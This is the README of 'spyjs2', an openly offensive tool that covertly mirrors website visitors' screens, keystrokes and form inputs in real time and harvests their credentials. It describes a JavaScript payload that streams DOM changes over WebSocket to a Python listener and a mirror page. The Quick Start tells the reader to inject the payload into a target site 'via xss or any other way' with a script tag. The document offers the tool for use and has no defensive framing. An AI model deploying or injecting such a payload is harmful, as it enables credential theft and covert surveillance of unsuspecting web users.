# spyjs2
This tool is as a continuation and improved version of my other tool i built several years ago [spyjs](https://github.com/0xN7y/spyjs/) 

A real time mirroring system that spy on web user and establishes persistent observation of target web applications. it capture user interaction, harvest credentials, and monitor interactions.

# How It Works

The payload (spy.js)

    Sits on the target website
    Uses MutationObserver to watch DOM changes
    Sends everything via WebSocket 

The listener 
 
    Python WebSocket server
    Relays messages between payload and mirrors

The Mirror (mirror.html)

    Shows real-time replay of user's screen
    Displays mouse movements and clicks
    Updates inputs as user types


# Quick Start

1. Start the Spy Headquarters
```bash
python3 listen.py
````

2. Inject payload to  target via xss or any other way 
```html
<script src="spys.js"></script>
````
3. Open the Mirror
```
open mirror.html # open it in your browser
```

![Screenshot](/imgs/waiting.png)
![Screenshot](/imgs/conn.png)
